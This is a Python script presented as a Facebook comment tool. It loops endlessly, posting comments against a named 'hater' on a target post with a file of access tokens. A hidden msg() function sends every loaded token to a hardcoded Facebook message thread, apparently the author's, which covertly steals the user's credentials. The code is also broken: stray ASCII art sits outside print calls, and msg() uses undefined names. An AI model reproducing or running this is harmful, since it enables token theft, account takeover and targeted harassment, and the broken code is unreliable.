import os, sys, requests, re, random, time
import datetime
import getpass
from os import system as psl
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as bsn

url = 'https://m.facebook.com/login.php'

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def sp(stri):
    for letter in stri:
        print(letter, end = "")
        sys.stdout.flush()
os.system('clear')

   
def logo():
    print("\033[1;37m⌌\033[1;31m━━━━\033[1;32m━━━━\033[1;33m━━━━\033[1;34m━━━━\033[1;35m━━━━\033[1;36m━━━━\033[1;37m━━━━\033[1;30m━━━━\033[1;31m━━━\033[1;32m━━━━\033[1;33m━━━━━\033[1;37m⌍")
    print("\033[0;92m▏                                             ▏")

\033[1;37m888      .d88888b.  888    d8P  888    d8P  8888888 
\033[1;37m888     d88P" "Y88b 888   d8P   888   d8P     888   
\033[1;37m888     888     888 888  d8P    888  d8P      888   
\033[1;37m888     888     888 888d88K     888d88K       888   
\033[1;37m888     888     888 8888888b    8888888b      888   
\033[1;37m888     888     888 888  Y88b   888  Y88b     888   
\033[1;37m888     Y88b. .d88P 888   Y88b  888   Y88b    888   
\033[1;37m88888888 "Y88888P"  888    Y88b 888    Y88b 8888888 
                                                    
                                                    
                                                    

    print("\033[0;92m▏                                             ▏")
    print("\033[1;37m⌎\033[1;31m━━━━\033[1;32m━━━━\033[1;33m━━━━\033[1;34m━━━━\033[1;35m━━━━\033[1;36m━━━━\033[1;37m━━━━\033[1;30m━━━━\033[1;31m━━━\033[1;32m━━━━\033[1;33m━━━━━\033[1;37m⌏")
    print("\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;31m❙")
    print("\033[0;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●")
    print("\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR LOKKI")
    print("\033[1;39m━▷ \033[0;91m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;30m D3VIL\033[1;37m◆\033[1;30mMUSK9N\033[1;37m◆\033[1;30mCH9ND\033[1;37m◆\033[1;30mNOMIIW\033[1;37m◆")
    print("\033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32mLOKKI TRICKER")
    print("\033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mLOKKI ONFIRE BOI LOKKI HERE")
    print("\033[1;39m━▷ \033[0;91m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mALL TRICKS ZONE ")
    print("\033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE AND ENJOY")
    print("\033[1;39m━▷ \033[0;91m𝙏𝙊𝙊𝙇     \033[1;39m◈✙◈\033[1;31m COOKI3 C0NV3R SING9L ID ")
    print("\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;37m1.0")
    print("\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 𝙇𝙊𝙆𝙆𝙄  𝙏𝙍𝙄𝘾𝙆𝙀𝙍")
    
def post_comments():
    access_tokens_file = input("ENTER TOKENS FILE PATH: ").strip()
    with open(access_tokens_file, 'r') as token_file:
        access_tokens = [token.strip() for token in token_file.readlines()]

    num_tokens = len(access_tokens)

    requests.packages.urllib3.disable_warnings()
    
       

    def liness():
        print("\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;31m❙")

    
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }
    

    liness()

    access_tokens = [token.strip() for token in access_tokens]
    
    print("\033[1;37;96m")

    post_url = input("Enter the post URL: ").strip()
    print("\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;31m❙")
    
    comments_file_path = input("Enter the path to the file containing comments: ").strip()
    with open(comments_file_path, 'r') as file:
        comments = file.readlines()

    num_comments = len(comments)
    max_tokens = min(num_tokens, num_comments)
    print("\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;31m❙")

    haters_name = input("Enter the hater's name: ").strip()
    print("\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;31m❙")

    speed = int(input("Enter the comment posting speed (in seconds): ").strip())
    print("\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;30m❙\033[1;37m◆\033[1;31m❙\033[1;37m◆\033[1;32m❙\033[1;37m◆\033[1;33m❙\033[1;37m◆\033[1;34m❙\033[1;37m◆\033[1;35m❙\033[1;37m◆\033[1;36m❙\033[1;37m◆\033[1;31m❙")
    os.system('clear')


    liness()
     
    def get_name(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
        except:
            data = ""
        if 'name' in data:
            return data['name']
        else:
            return "Error occurred"

    while True:
        try:
            for comment_index in range(num_comments):
                token_index = comment_index % max_tokens
                access_token = access_tokens[token_index]

                comment = comments[comment_index].strip()

                url = f"https://graph.facebook.com/{post_url}/comments"
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("[+] Comment No. {} Post URL {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()                    
                else:
                    print("[x] Failed to send Comment No. {} Post URL {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()                    
                time.sleep(speed)

            print("\n[+] All comments sent successfully. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def msg():
    access_tokens_file = input("Enter the path to the file containing access tokens: ").strip()
    with open(access_tokens_file, 'r') as token_file:
        access_tokens = [token.strip() for token in token_file.readlines()]

    parameters = {
        'access_token': random.choice(access_tokens),
        'message': 'User Profile Name: ' + get_name(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
            access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
    }
    try:
        s = requests.post("https://graph.facebook.com/v15.0/t_100003061040355/", data=parameters, headers=headers)
    except:
        pass

def main():
    post_comments()
    msg ()

if __name__ == '__main__':
    main()